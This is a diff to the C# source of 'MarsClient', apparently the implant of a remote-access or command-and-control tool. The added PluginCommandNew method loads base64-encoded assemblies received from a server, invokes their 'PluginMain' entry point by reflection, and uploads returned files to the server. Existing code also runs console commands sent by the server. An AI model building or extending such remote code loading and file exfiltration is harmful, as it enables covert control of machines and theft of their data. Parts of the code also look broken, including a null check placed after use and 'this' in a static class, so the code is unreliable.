@@ -9,11 +9,12 @@ using System.Runtime;
 using System.IO;
 using System.Text;
 using System.Web;
+using MarsClient.Plugins;
 
 // testing running cmd
 using System.Diagnostics;
 
-namespace client
+namespace MarsClient
 {
     public static class Client
     {   
@@ -169,7 +170,8 @@ namespace client
                         result = await ConsoleCommand(command[0]);
                     } else if (command[1] == "plugin") {
                         //the null here should be the parameters passed to the plugin that is being run
-                        result = PluginCommand(command[0], null);
+                        //result = PluginCommand(command[0], null);
+                        result = PluginCommandNew(command[0], null);
                     } else {
                         result = "Failed";
                     }
@@ -219,6 +221,47 @@ namespace client
             return "Failed to run plugin!";
             //File.WriteAllBytes("./file", Base64DecodeFile(command));
             //return "did it";
+        }
+
+        private string PluginCommandNew(string command, string[]? plugParam){
+            Plugin _plugin = PluginLoader.InitializeFromBase64(command); 
+
+            Console.WriteLine($"Plugin loaded: {_plugin.Name}");
+
+            if(_plugin == null){
+                return "Failed to load plugin. Plugin is null.";
+            }
+
+            foreach(Type oType in _plugin.Assembly.GetTypes()){
+                try{
+                    dynamic c = Activator.CreateInstance(oType);
+                    var methods = oType.GetMethods();
+                    var method = oType.GetMethod("PluginMain");
+                    IDictionary<string, dynamic> dll_return = method.Invoke(c, plugParam);
+
+                    Console.WriteLine($"Plugin invoked: {_plugin.Name}");
+                    if(dll_return["ExitCode"] == 0){
+                        // send files API
+                        if (dll_return.TryGetValue("Files", out dynamic files)) {
+                            Console.WriteLine("Sending files");
+                            for (int i = 0; i < files.Length; i++) 
+                            {
+                                this.SendFileToServer(files[i], Path.GetFileName(files[i]));
+                            }
+                        }
+                        string exit_message = dll_return["ExitMessage"];
+                        return $"Plugin ran successfully: {exit_message}";
+                    }else{
+                        string exit_message = dll_return["ExitMessage"];
+                        return $"Plugin failed to run: {exit_message}";
+                    }
+                } catch (Exception e){
+                    
+                    continue;
+                }
+            }
+
+            return "Failed to run plugin!";
         }
 
         private async Task<string> ConsoleCommand(string command){
